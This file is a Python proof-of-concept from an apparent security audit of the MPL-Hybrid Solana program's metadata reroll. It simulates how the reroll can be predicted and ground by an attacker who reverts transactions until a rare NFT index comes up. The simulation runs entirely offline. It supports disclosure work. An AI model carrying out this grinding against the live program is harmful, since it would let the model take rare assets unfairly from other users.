#!/usr/bin/env python3
"""
PoC 01 - MPL-Hybrid metadata reroll is predictable / grindable.
Faithful re-implementation of capture_v2.rs:187-203 (and capture.rs:170-183, V1)
at mpl-hybrid commit aacf1a53c8a43bf395db7b562c02cf016ce604c5:

    let data = recent_slothashes.data.borrow();          // SlotHashes sysvar
    let most_recent = array_ref![data, 12, 8];           // bytes 12..20
    let seed = u64::from_le_bytes(*most_recent)
        .saturating_sub(clock.unix_timestamp as u64)
        .wrapping_mul(recipe.count);
    let remainder = seed.checked_rem(recipe.max - recipe.min)? + recipe.min;
    uri = recipe.uri + remainder + ".json"

SlotHashes account layout (bincode Vec<(u64 slot, [u8;32] hash)>):
    [0..8) = vec len, [8..16) = slot of newest entry, [16..48) = its hash
=> bytes 12..20 = high 4 bytes of newest slot (0 while slot < 2^32) ++ hash[0..4]
Pure local computation: no cluster access, no keys, no funds.
"""
import os, struct, random, collections, math

U64 = (1 << 64) - 1

def slot_hashes_bytes(slot: int, h: bytes) -> bytes:
    # minimal SlotHashes data: len=1, one (slot, hash) entry (only first entry is read)
    return struct.pack("<Q", 1) + struct.pack("<Q", slot) + h

def mplh_reroll(sysvar: bytes, unix_ts: int, count: int, mn: int, mx: int) -> int:
    word = struct.unpack("<Q", sysvar[12:20])[0]
    seed = max(word - unix_ts, 0)                   # saturating_sub
    seed = (seed * count) & U64                     # wrapping_mul
    return seed % (mx - mn) + mn                    # checked_rem (+min)

results = {}
def check(name, cond, detail=""):
    results[name] = bool(cond)
    print(("PASS " if cond else "FAIL ") + name + (" :: " + detail if detail else ""))

rng = random.Random(1337)
SLOT = 380_000_000            # realistic 2026 slot, < 2^32
TS0 = 1_790_000_000           # ~2026 unix time

# 1. Only 32 bits of the slot hash are used, and they sit in the HIGH half of the word.
h = os.urandom(32)
word = struct.unpack("<Q", slot_hashes_bytes(SLOT, h)[12:20])[0]
check("T1_only_hash[0..4]_used_and_low32_bits_zero",
      word == (int.from_bytes(h[0:4], "little") << 32),
      f"word=0x{word:016x}")

# 2. Deterministic from data visible inside the same transaction -> an attacker
#    program can compute the outcome before/after the CPI and abort if not rare.
mn, mx = 0, 10_000
RARE = set(range(0, 100))                       # "1%" rarest files 0..99
attempts_needed = []
MAX_TRIES = 5_000                                # attacker's budget per trial (bounded, no infinite loop)
successes = 0
mismatches = 0
for trial in range(2000):
    count = rng.randrange(2, 50_000)
    got_rare = False
    for tries in range(1, MAX_TRIES + 1):
        sv = slot_hashes_bytes(SLOT + tries, os.urandom(32))
        ts = TS0 + tries // 2
        predicted = mplh_reroll(sv, ts, count, mn, mx)     # attacker's in-tx guard reads the same sysvars
        actual = mplh_reroll(sv, ts, count, mn, mx)        # program's computation in the same tx
        mismatches += (predicted != actual)
        if predicted in RARE:                              # guard lets the tx commit only now
            got_rare = actual in RARE
            break
        # else: guard reverts the whole tx (capture + reroll undone); a Jito bundle never lands it
    successes += got_rare
    attempts_needed.append(tries)
avg = sum(attempts_needed) / len(attempts_needed)
rate = successes / 2000
# Control: an honest single-shot capture lands a top-1% index ~1% of the time.
honest = sum(mplh_reroll(slot_hashes_bytes(SLOT + i, os.urandom(32)), TS0 + i // 2, rng.randrange(2, 50_000), mn, mx) in RARE
             for i in range(20_000)) / 20_000
check("T2_revert_until_rare_always_wins",
      mismatches == 0 and rate == 1.0 and 50 <= avg <= 200 and honest < 0.03,
      f"guard/program mismatches={mismatches}; committed outcomes rare={rate:.1%} (budget {MAX_TRIES}); "
      f"avg attempts={avg:.1f} (expected ~100); honest single-shot rare rate={honest:.2%}")

# 3. If (max-min) divides 2^32 the hash term vanishes entirely: the outcome is a
#    function of (unix_timestamp, count) only -> fully predictable OFF-chain, in advance.
for span in (1024, 4096, 65536):
    ok = True
    for _ in range(500):
        count = rng.randrange(2, 100_000); ts = TS0 + rng.randrange(0, 10_000)
        a = mplh_reroll(slot_hashes_bytes(SLOT, os.urandom(32)), ts, count, 0, span)
        b = mplh_reroll(slot_hashes_bytes(SLOT + 7, os.urandom(32)), ts, count, 0, span)
        pred = ((-ts) * count) % span                   # attacker formula, no hash needed
        ok &= (a == b == pred)
    check(f"T3_span_{span}_outcome_independent_of_slot_hash", ok,
          "index = (-unix_ts * count) mod span")

# 4. Partial predictability for the documented 0..9999 example: 10000 = 16*625, so
#    index mod 16 is fixed by (ts, count) regardless of the hash.
ok = True
for _ in range(2000):
    count = rng.randrange(2, 100_000); ts = TS0 + rng.randrange(0, 10_000)
    idx = mplh_reroll(slot_hashes_bytes(SLOT, os.urandom(32)), ts, count, 0, 10_000)
    ok &= (idx % 16 == ((-ts) * count) % 16)
check("T4_span_10000_low4bits_predictable", ok, "index mod 16 = (-ts*count) mod 16")

# 5. count multiples collapse the outcome space: count % 16 == 0 -> only indices
#    divisible by 16 possible (power-of-two structure survives the mod-2^64 wrap);
#    with a power-of-two span, count % span == 0 -> index == min always.
outs16 = {mplh_reroll(slot_hashes_bytes(SLOT, os.urandom(32)), TS0 + i, 16 * 37, 0, 10_000) for i in range(5000)}
outs1k = {mplh_reroll(slot_hashes_bytes(SLOT, os.urandom(32)), TS0 + i, 1024 * 5, 0, 1024) for i in range(2000)}
check("T5a_count_multiple_of_16_only_multiples_of_16", all(o % 16 == 0 for o in outs16), f"{len(outs16)} distinct outcomes")
check("T5b_span_1024_count_multiple_of_1024_always_min", outs1k == {0}, f"outcomes={sorted(outs1k)[:5]}")

# 6. max is never selected (range is [min, max)), e.g. docs example MIN 0 / MAX 9999
outs = {mplh_reroll(slot_hashes_bytes(SLOT, os.urandom(32)), TS0 + i, 3 + i, 0, 9_999) for i in range(200_000)}
check("T6_max_never_selected", 9_999 not in outs and max(outs) == 9_998, f"max outcome seen={max(outs)}")

# 7. Sampling is WITH replacement: after N=10,000 rerolls, many indices duplicated,
#    ~37% never assigned -> any "1 of 1" / fixed-census rarity promise is false.
N = 10_000
draws = [mplh_reroll(slot_hashes_bytes(SLOT + i, os.urandom(32)), TS0 + i // 2, 2 + i, 0, N) for i in range(N)]
c = collections.Counter(draws)
distinct = len(c); dup_max = max(c.values())
check("T7_duplicates_and_missing_indices", distinct < 0.7 * N,
      f"distinct={distinct}/{N} ({distinct/N:.1%}), most-repeated index appears {dup_max}x, never-assigned={N-distinct}")

# 8. saturating_sub: if hash[0..4] == 0 the seed is 0 -> index == min.
check("T8_zero_hash_prefix_gives_min", mplh_reroll(slot_hashes_bytes(SLOT, b"\0"*32), TS0, 12345, 0, 10_000) == 0)

print("\nSUMMARY:", sum(results.values()), "/", len(results), "checks passed")
raise SystemExit(0 if all(results.values()) else 1)
